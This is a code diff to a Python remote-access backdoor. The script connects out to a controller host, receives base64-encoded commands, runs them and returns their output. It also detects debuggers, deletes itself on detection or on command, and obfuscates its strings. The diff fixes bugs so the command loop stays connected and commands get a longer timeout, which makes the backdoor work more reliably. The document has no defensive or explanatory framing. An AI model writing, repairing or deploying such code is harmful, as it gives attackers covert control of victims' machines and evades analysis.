@@ -42,6 +42,7 @@ def execute_command( cmd ):
     output = obfuscate( STR_COMMAND_TOOK_LONG )
 
     def target():
+        nonlocal output
         global current_dir  # Declare the use of the global variable
         if cmd.startswith("cd "):
             os.chdir(os.path.join(current_dir, cmd[3:]))
@@ -54,7 +55,7 @@ def execute_command( cmd ):
 
     thread = threading.Thread( target = target )
     thread.start()
-    thread.join( timeout = 10 )
+    thread.join( timeout = 10000 )
     if thread.is_alive():
         thread.join()  # Make sure to clean up if still running
     return output
@@ -86,24 +87,24 @@ def main():
         print( STR_DEBUGGER_DETECTED )
         self_destruct()
 
-    s = socket.socket()
-    s.connect( ( host, port ) )
-    print( STR_CONNECTED_TO_SERVER )
-    
-    while True:
-        encoded_cmd = s.recv( 4096 ).decode().strip()
-        if not encoded_cmd:
-            break
+    with socket.socket() as s: 
+        s = socket.socket()
+        s.connect( ( host, port ) )
+        print( STR_CONNECTED_TO_SERVER )
+        
+        while True:
+            encoded_cmd = s.recv( 4096 ).decode().strip()
+            if not encoded_cmd:
+                break
 
-        cmd = base64.b64decode( encoded_cmd ).decode()
-        if cmd == obfuscate( STR_SELF_DESTRUCT ):
-            self_destruct()
+            cmd = base64.b64decode( encoded_cmd ).decode()
+            if cmd == obfuscate( STR_SELF_DESTRUCT ):
+                self_destruct()
 
-        print( STR_COMMAND_RECEIVED )
-        output = execute_command( cmd )
-        print( STR_SENDING_OUTPUT )
-        send_all( s , output )
-        s.close()
+            print( STR_COMMAND_RECEIVED )
+            output = execute_command( cmd )
+            print( STR_SENDING_OUTPUT )
+            send_all( s , output )
 
 if __name__ == '__main__':
     main()
